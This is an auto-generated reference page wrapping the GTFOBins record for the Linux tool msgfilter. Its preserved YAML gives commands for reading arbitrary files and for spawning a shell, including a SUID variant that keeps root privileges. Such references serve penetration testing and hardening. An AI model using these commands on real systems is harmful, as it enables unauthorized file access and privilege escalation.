---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# msgfilter

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `msgfilter` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/msgfilter` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [msgfilter](../../tools/linux/msgfilter.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | msgfilter |
| name | msgfilter |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/msgfilter/ |

## Preserved Source Material

```yaml
_body: ''
_name: msgfilter
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/msgfilter
functions:
  file-read:
  - binary: false
    code: msgfilter -P -i /path/to/input-file /bin/cat
    comment: The file is parsed and displayed as a Java `.properties` file. `/bin/cat` can be replaced with any other *filter*
      program.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  shell:
  - code: echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
    comment: The `kill` command is needed to spawn the shell only once. Instead of readinf from standard input, it can read
      files passed via the `-i` option.
    contexts:
      sudo: null
      suid:
        code: echo x | msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
        shell: false
      unprivileged: null
```
